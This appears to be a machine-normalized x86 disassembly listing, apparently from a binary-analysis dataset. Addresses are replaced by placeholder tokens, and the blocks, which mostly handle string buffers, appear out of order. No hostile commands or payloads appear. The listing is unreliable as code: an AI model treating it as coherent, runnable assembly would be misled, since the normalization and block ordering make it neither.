add esp 0x8
mov [ ebp - 0x20 ] 0x24
mov esi [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x20 ] 0x18
mov [ ebp - 0x20 ] 0x0
xor edx edx
jmp r-xdata
cmp [ ebx + 0x24 ] 0x10
mov edx rw-data
jb r-xdata
push esi
call sub_4b9bf8
pop ecx
mov [ esi + 0x10 ] 0x3f
push rw-data
call sub_4c4e7c
pop ecx
mov edi eax
lea ebx [ esi + 0x18 ]
mov eax rw-data
test eax eax
je r-xdata
test dl dl
je r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
lea eax [ ebx + 0x8 ]
push eax
call sub_408880
pop ecx
mov [ ebp - 0xc4 ] eax
cmp [ ebp - 0xc4 ] 0x1
ja r-xdata
cmp [ ebx + 0x24 ] 0x10
mov eax rw-data
jb r-xdata
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp edx ecx
jb r-xdata
mov edx [ ebp - 0xc4 ]
dec edx
mov edx 0x1
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
cmp edi [ ebx + 0x24 ]
jbe r-xdata
push ebx
call sub_4bbca8
pop ecx
cmp edi edx
jbe r-xdata
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x38 ] edx
cmp edi [ ebp - 0x38 ]
jae r-xdata
push ebx
call sub_4bc8cc
pop ecx
sub eax ecx
mov [ ebp - 0x34 ] eax
mov eax [ ebx + 0x20 ]
cmp eax [ ebp - 0x34 ]
jae r-xdata
mov dl 0x1
add eax [ ebx + 0x20 ]
cmp eax rw-data
ja r-xdata
test edi edi
jne r-xdata
mov eax [ ebx + 0x20 ]
push eax
push edi
push ebx
call sub_408678
add esp 0xc
jmp r-xdata
cmp ebx ebx
jne r-xdata
mov [ ebp - 0x38 ] edi
test edi edi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0xe1 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x80 ] eax
lea edx [ ebx + 0x8 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0x84 ] eax
cmp [ ebp - 0x84 ] 0x1
ja r-xdata
mov [ ebp - 0x3c ] 0xffffffff
mov eax [ ebp - 0x34 ]
add eax [ ebp - 0x38 ]
mov [ ebp - 0x40 ] eax
mov edx [ ebx + 0x20 ]
cmp edx [ ebp - 0x40 ]
jae r-xdata
mov eax esi
mov [ rw-data ] eax
add eax 0x4
push eax
call sub_4c3b78
pop ecx
push rw-data
push 0x10
call sub_415614
add esp 0x8
mov [ ebp - 0xc ] eax
test eax eax
je r-xdata
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0x84 ]
dec ecx
mov ecx 0x1
jmp r-xdata
mov ecx [ ebx + 0x20 ]
sub ecx [ ebp - 0x40 ]
cmp ecx [ ebp - 0x3c ]
jae r-xdata
push ebx
call sub_4bc8cc
pop ecx
mov [ ebp - 0x20 ] 0x60
mov edx [ rw-data ]
mov [ ebp - 0xf8 ] edx
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0xf8 ]
mov [ ecx + 0x8 ] eax
mov [ ebp - 0x20 ] 0x48
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0xe8 ] eax
mov eax [ ebp - 0xe8 ]
mov cl [ ebp - 0xe1 ]
mov [ eax ] cl
mov eax [ ebx + 0x24 ]
cmp eax [ ebp - 0x80 ]
jae r-xdata
push ebx
call sub_4bbca8
pop ecx
cmp ecx [ ebp - 0x80 ]
jae r-xdata
cmp [ ebp - 0x3c ] 0x0
jbe r-xdata
mov eax [ ebx + 0x20 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x3c ] eax
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0xec ] edx
push edi
push rw-data
mov eax [ ebp - 0xec ]
push eax
call sub_4c4cb0
add esp 0xc
mov [ ebp - 0xed ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp [ ebp - 0x80 ] 0x0
jne r-xdata
mov edx [ ebx + 0x20 ]
push edx
mov eax [ ebp - 0x80 ]
push eax
push ebx
call sub_408678
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x20 ] 0x0
jae r-xdata
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x40 ]
sub edx [ ebp - 0x3c ]
mov [ ebp - 0x44 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov [ ebx + 0x20 ] edi
add ecx edi
mov [ ebp - 0xf4 ] ecx
mov eax [ ebp - 0xf4 ]
mov dl [ ebp - 0xed ]
mov [ eax ] dl
cmp [ ebp - 0x80 ] 0x0
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0xa1 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x20 ]
cmp edx [ ebp - 0x60 ]
jae r-xdata
push ebx
call sub_4bc8cc
pop ecx
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov edx [ ebp - 0x38 ]
mov [ ebp - 0xac ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x60 ] 0x0
jbe r-xdata
mov ecx [ ebx + 0x20 ]
mov [ ebp - 0x60 ] ecx
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add ecx [ ebp - 0x40 ]
add ecx [ ebp - 0x3c ]
mov [ ebp - 0x48 ] ecx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0xa8 ] eax
mov eax [ ebp - 0xa8 ]
mov cl [ ebp - 0xa1 ]
mov [ eax ] cl
mov eax [ ebx + 0x20 ]
sub eax [ ebp - 0x60 ]
mov [ ebp - 0x64 ] eax
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add eax [ ebp - 0x40 ]
mov [ ebp - 0x4c ] eax
mov edx [ ebp - 0x44 ]
push edx
mov ecx [ ebp - 0x48 ]
push ecx
mov eax [ ebp - 0x4c ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x3c ]
mov [ ebp - 0x50 ] edx
mov ecx [ ebp - 0x50 ]
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x55 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add ecx [ ebp - 0x34 ]
mov [ ebp - 0xb0 ] ecx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov edx [ ebp - 0x54 ]
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x5c ]
mov cl [ ebp - 0x55 ]
mov [ eax ] cl
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0xb4 ] eax
mov edx [ ebp - 0xac ]
push edx
mov ecx [ ebp - 0xb0 ]
push ecx
mov eax [ ebp - 0xb4 ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x38 ]
mov [ ebp - 0xb8 ] edx
mov [ ebp - 0xb9 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add edx [ ebp - 0x60 ]
mov [ ebp - 0x68 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov eax [ ebp - 0xb8 ]
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0xc0 ] ecx
mov edx [ ebp - 0xc0 ]
mov cl [ ebp - 0xb9 ]
mov [ edx ] cl
jmp r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0x6c ] eax
mov edx [ ebp - 0x64 ]
push edx
mov ecx [ ebp - 0x68 ]
push ecx
mov eax [ ebp - 0x6c ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x60 ]
mov [ ebp - 0x70 ] edx
mov ecx [ ebp - 0x70 ]
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x75 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebp - 0x74 ]
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x7c ] eax
mov eax [ ebp - 0x7c ]
mov cl [ ebp - 0x75 ]
mov [ eax ] cl
jmp r-xdata
sub_4ba37c
push ebp
mov ebp esp
add esp 0xffffffd8
mov eax rw-data
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
call sub_4c517c
cmp [ rw-data ] 0x0
jne r-xdata
push 0x8
call sub_4bbbac
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
push sub_4b9a88
call sub_4c3908
pop ecx
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x18 ] 0x24
mov edx [ ebp - 0x4 ]
mov edi [ rw-data ]
mov esi ebx
mov [ edx ] edi
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] esi
mov [ ebp - 0x18 ] 0xc
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov [ rw-data ] eax
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4ba414
push ebp
mov ebp esp
add esp 0xffffff18
mov eax rw-data
push ebx
push esi
push edi
call sub_4c517c
mov [ ebp - 0x14 ] 0xc
mov ecx [ ebp + 0x8 ]
mov edx rw-data
mov [ ecx ] edx
mov edx rw-data
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x1
inc [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
xor edx edx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] edx
xor eax eax
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xc ] eax
xor ecx ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x10 ] ecx
mov eax [ ebp + 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x14 ] dl
lea eax [ ebp - 0x2c ]
mov ebx [ ebp + 0x8 ]
push eax
add ebx 0x18
call sub_408628
pop ecx
lea edx [ ebp - 0x2c ]
push edx
lea ecx [ ebx + 0x8 ]
push ecx
call sub_408650
add esp 0x8
mov edx 0xf
mov [ ebx + 0x24 ] edx
xor eax eax
cmp edx 0x10
jb r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + 0x24 ] 0x10
mov edx rw-data
jb r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add ecx edx
mov edx ecx
mov [ edx ] al
push rw-data
call sub_4c4e7c
pop ecx
mov esi eax
mov eax rw-data
test eax eax
je r-xdata
test dl dl
je r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
lea eax [ ebx + 0x8 ]
push eax
call sub_408880
pop ecx
mov [ ebp - 0xbc ] eax
cmp [ ebp - 0xbc ] 0x1
ja r-xdata
cmp [ ebx + 0x24 ] 0x10
mov eax rw-data
jb r-xdata
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp edx ecx
jb r-xdata
mov edx [ ebp - 0xbc ]
dec edx
mov edx 0x1
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
cmp esi [ ebx + 0x24 ]
jbe r-xdata
push ebx
call sub_4bbca8
pop ecx
cmp esi edx
jbe r-xdata
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x30 ]
mov [ ebp - 0x34 ] edx
cmp esi [ ebp - 0x34 ]
jae r-xdata
push ebx
call sub_4bc8cc
pop ecx
sub eax ecx
mov [ ebp - 0x30 ] eax
mov eax [ ebx + 0x20 ]
cmp eax [ ebp - 0x30 ]
jae r-xdata
mov dl 0x1
add eax [ ebx + 0x20 ]
cmp eax rw-data
ja r-xdata
test esi esi
jne r-xdata
mov eax [ ebx + 0x20 ]
push eax
push esi
push ebx
call sub_408678
add esp 0xc
jmp r-xdata
cmp ebx ebx
jne r-xdata
mov [ ebp - 0x34 ] esi
test esi esi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0xd5 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edi [ ebp - 0x34 ]
lea eax [ ebx + 0x8 ]
push eax
call sub_408880
pop ecx
mov [ ebp - 0x7c ] eax
cmp [ ebp - 0x7c ] 0x1
ja r-xdata
mov [ ebp - 0x38 ] 0xffffffff
mov eax [ ebp - 0x30 ]
add eax [ ebp - 0x34 ]
mov [ ebp - 0x3c ] eax
mov edx [ ebx + 0x20 ]
cmp edx [ ebp - 0x3c ]
jae r-xdata
inc [ ebp - 0x8 ]
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov edx [ ebp - 0x7c ]
dec edx
mov edx 0x1
jmp r-xdata
mov ecx [ ebx + 0x20 ]
sub ecx [ ebp - 0x3c ]
cmp ecx [ ebp - 0x38 ]
jae r-xdata
push ebx
call sub_4bc8cc
pop ecx
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0xdc ] ecx
mov edx [ ebp - 0xdc ]
mov cl [ ebp - 0xd5 ]
mov [ edx ] cl
cmp edi [ ebx + 0x24 ]
jbe r-xdata
push ebx
call sub_4bbca8
pop ecx
cmp edi edx
jbe r-xdata
cmp [ ebp - 0x38 ] 0x0
jbe r-xdata
mov eax [ ebx + 0x20 ]
sub eax [ ebp - 0x3c ]
mov [ ebp - 0x38 ] eax
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0xe0 ] edx
push esi
push rw-data
mov eax [ ebp - 0xe0 ]
push eax
call sub_4c4cb0
add esp 0xc
mov [ ebp - 0xe1 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
test edi edi
jne r-xdata
mov eax [ ebx + 0x20 ]
push eax
push edi
push ebx
call sub_408678
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x5c ] eax
cmp [ ebx + 0x20 ] 0x0
jae r-xdata
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x3c ]
sub edx [ ebp - 0x38 ]
mov [ ebp - 0x40 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov [ ebx + 0x20 ] esi
add ecx esi
mov [ ebp - 0xe8 ] ecx
mov eax [ ebp - 0xe8 ]
mov dl [ ebp - 0xe1 ]
mov [ eax ] dl
test edi edi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x99 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x20 ]
cmp edx [ ebp - 0x5c ]
jae r-xdata
push ebx
call sub_4bc8cc
pop ecx
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov edx [ ebp - 0x34 ]
mov [ ebp - 0xa4 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x5c ] 0x0
jbe r-xdata
mov ecx [ ebx + 0x20 ]
mov [ ebp - 0x5c ] ecx
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add ecx [ ebp - 0x3c ]
add ecx [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0xa0 ] eax
mov eax [ ebp - 0xa0 ]
mov cl [ ebp - 0x99 ]
mov [ eax ] cl
mov eax [ ebx + 0x20 ]
sub eax [ ebp - 0x5c ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add eax [ ebp - 0x3c ]
mov [ ebp - 0x48 ] eax
mov edx [ ebp - 0x40 ]
push edx
mov ecx [ ebp - 0x44 ]
push ecx
mov eax [ ebp - 0x48 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x38 ]
mov [ ebp - 0x4c ] edx
mov ecx [ ebp - 0x4c ]
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x51 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add ecx [ ebp - 0x30 ]
mov [ ebp - 0xa8 ] ecx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov edx [ ebp - 0x50 ]
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x58 ]
mov cl [ ebp - 0x51 ]
mov [ eax ] cl
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0xac ] eax
mov edx [ ebp - 0xa4 ]
push edx
mov ecx [ ebp - 0xa8 ]
push ecx
mov eax [ ebp - 0xac ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x34 ]
mov [ ebp - 0xb0 ] edx
mov [ ebp - 0xb1 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add edx [ ebp - 0x5c ]
mov [ ebp - 0x64 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov eax [ ebp - 0xb0 ]
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0xb8 ] ecx
mov edx [ ebp - 0xb8 ]
mov cl [ ebp - 0xb1 ]
mov [ edx ] cl
jmp r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0x68 ] eax
mov edx [ ebp - 0x60 ]
push edx
mov ecx [ ebp - 0x64 ]
push ecx
mov eax [ ebp - 0x68 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x5c ]
mov [ ebp - 0x6c ] edx
mov ecx [ ebp - 0x6c ]
mov [ ebp - 0x70 ] ecx
mov [ ebp - 0x71 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebp - 0x70 ]
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x78 ] eax
mov eax [ ebp - 0x78 ]
mov cl [ ebp - 0x71 ]
mov [ eax ] cl
jmp r-xdata
sub_4baa1c
push ebp
mov ebp esp
add esp 0xffffffcc
mov eax rw-data
push ebx
push esi
push edi
call sub_4c517c
mov [ ebp - 0x14 ] 0x2
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x20 ] 0xc
mov ecx [ ebp + 0x8 ]
mov edx rw-data
xor eax eax
mov [ ecx ] edx
mov [ ebp - 0x20 ] 0x18
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp eax 0x1
je r-xdata
push eax
call sub_4c3b24
pop ecx
cmp eax 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
call sub_4c429c
pop ecx
dec [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
cmp eax 0x1
je r-xdata
dec ebx
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
cmp [ edx + ebx * 4 ] 0x0
je r-xdata
inc [ ebp - 0x14 ]
mov [ ebp - 0x20 ] 0xc
mov edx [ ebp + 0x8 ]
mov ebx [ edx + 0xc ]
mov [ ebp - 0x20 ] 0xc
test ebx ebx
jbe r-xdata
push eax
call sub_4c3b58
pop ecx
cmp eax 0x3
jne r-xdata
test ebx ebx
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
mov esi [ eax + ebx * 4 ]
lea edx [ esi + 0x4 ]
push edx
call sub_4c3b88
pop ecx
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
xor eax eax
cmp edx 0x10
jb r-xdata
mov esi [ ebx + 0x10 ]
mov edi esi
push edi
call sub_4b0180
pop ecx
mov [ ebp - 0x20 ] 0xc
dec [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
add ebx 0x18
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
xor edi edi
mov edi esi
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov eax [ edi ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x20 ] 0x3c
push 0x3
mov edx [ ebp - 0xc ]
push edx
mov ecx [ edx ]
call [ ecx ]
mov [ ebp - 0x20 ] 0x24
add esp 0x8
mov [ ebp - 0xc ] edi
test edi edi
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4b0180
pop ecx
xor edx edx
mov [ ebx + 0x20 ] edx
add ecx edx
mov edx ecx
mov [ edx ] al
dec [ ebp - 0x14 ]
test [ ebp + 0xc ] 0x1
je r-xdata
sub_4bab6c
push ebp
mov ebp esp
add esp 0xfffffe38
mov eax rw-data
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
call sub_4c517c
mov [ ebp - 0x14 ] 0xc
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov [ edx ] ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax 0x1
je r-xdata
push eax
call sub_4c3b24
pop ecx
cmp eax 0x3
jne r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
inc [ ebp - 0x8 ]
lea eax [ ebp - 0x2c ]
mov ebx [ ebp + 0x8 ]
push eax
add ebx 0x8
call sub_408628
pop ecx
lea edx [ ebp - 0x2c ]
push edx
lea ecx [ ebx + 0x8 ]
push ecx
call sub_408650
mov eax 0xf
xor edx edx
mov [ ebx + 0x24 ] eax
xor eax eax
mov [ ebx + 0x20 ] edx
add esp 0x8
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
add edx ecx
mov [ edx ] al
lea eax [ ebp - 0x34 ]
inc [ ebp - 0x8 ]
mov ebx [ ebp + 0x8 ]
push eax
add ebx 0x30
call sub_408628
pop ecx
lea edx [ ebp - 0x34 ]
push edx
lea ecx [ ebx + 0x8 ]
push ecx
call sub_408650
mov eax 0xf
xor edx edx
mov [ ebx + 0x24 ] eax
xor eax eax
mov [ ebx + 0x20 ] edx
add esp 0x8
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ esi + 0x10 ]
mov eax [ esi + 0x10 ]
jmp r-xdata
add edx ecx
mov [ ebp - 0x38 ] edx
mov edx [ ebp - 0x38 ]
mov [ edx ] al
inc [ ebp - 0x8 ]
cmp [ esi + 0x24 ] 0x10
jb r-xdata
mov edi eax
mov edi rw-data
jmp r-xdata
mov [ ebp - 0x3c ] eax
push 0x0
push 0xff
call sub_4cc76c
add esp 0x8
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
push edi
call sub_4c4e7c
mov ebx [ ebp + 0x8 ]
pop ecx
add ebx 0x8
test edi edi
mov esi eax
je r-xdata
test al al
je r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
lea eax [ ebx + 0x8 ]
push eax
call sub_408880
pop ecx
mov [ ebp - 0xd0 ] eax
cmp [ ebp - 0xd0 ] 0x1
ja r-xdata
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp edi eax
jb r-xdata
mov edx [ ebp - 0xd0 ]
dec edx
mov edx 0x1
jmp r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
cmp esi [ ebx + 0x24 ]
jbe r-xdata
push ebx
call sub_4bbca8
pop ecx
cmp esi edx
jbe r-xdata
mov ecx [ ebx + 0x20 ]
sub ecx [ ebp - 0x40 ]
mov [ ebp - 0x44 ] ecx
cmp esi [ ebp - 0x44 ]
jae r-xdata
push ebx
call sub_4bc8cc
pop ecx
sub edi edx
mov [ ebp - 0x40 ] edi
mov eax [ ebx + 0x20 ]
cmp eax [ ebp - 0x40 ]
jae r-xdata
mov al 0x1
add edx [ ebx + 0x20 ]
cmp edi edx
jb r-xdata
test esi esi
jne r-xdata
mov eax [ ebx + 0x20 ]
push eax
push esi
push ebx
call sub_408678
add esp 0xc
jmp r-xdata
cmp ebx ebx
jne r-xdata
mov [ ebp - 0x44 ] esi
test esi esi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0xed ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x8c ] eax
lea edx [ ebx + 0x8 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0x90 ] eax
cmp [ ebp - 0x90 ] 0x1
ja r-xdata
mov [ ebp - 0x48 ] 0xffffffff
mov eax [ ebp - 0x40 ]
add eax [ ebp - 0x44 ]
mov [ ebp - 0x4c ] eax
mov edx [ ebx + 0x20 ]
cmp edx [ ebp - 0x4c ]
jae r-xdata
cmp [ ebp - 0x3c ] 0x0
je r-xdata
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0x90 ]
dec ecx
mov ecx 0x1
jmp r-xdata
mov ecx [ ebx + 0x20 ]
sub ecx [ ebp - 0x4c ]
cmp ecx [ ebp - 0x48 ]
jae r-xdata
push ebx
call sub_4bc8cc
pop ecx
mov edx [ rw-data ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x3c ]
mov [ ebp - 0x104 ] ecx
mov eax [ ebp - 0x104 ]
push eax
push 0xff
call sub_4cc76c
add esp 0x8
mov [ ebp - 0x3c ] eax
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0xf4 ] eax
mov eax [ ebp - 0xf4 ]
mov cl [ ebp - 0xed ]
mov [ eax ] cl
mov eax [ ebx + 0x24 ]
cmp eax [ ebp - 0x8c ]
jae r-xdata
push ebx
call sub_4bbca8
pop ecx
cmp ecx [ ebp - 0x8c ]
jae r-xdata
cmp [ ebp - 0x48 ] 0x0
jbe r-xdata
mov eax [ ebx + 0x20 ]
sub eax [ ebp - 0x4c ]
mov [ ebp - 0x48 ] eax
mov eax [ rw-data ]
mov ecx [ eax ]
xor ecx ecx
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0xf8 ] edx
push esi
push edi
mov eax [ ebp - 0xf8 ]
push eax
call sub_4c4cb0
add esp 0xc
mov [ ebp - 0xf9 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp [ ebp - 0x8c ] 0x0
jne r-xdata
mov edx [ ebx + 0x20 ]
push edx
mov eax [ ebp - 0x8c ]
push eax
push ebx
call sub_408678
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x6c ] eax
cmp [ ebx + 0x20 ] 0x0
jae r-xdata
mov edx [ ebx + 0x20 ]
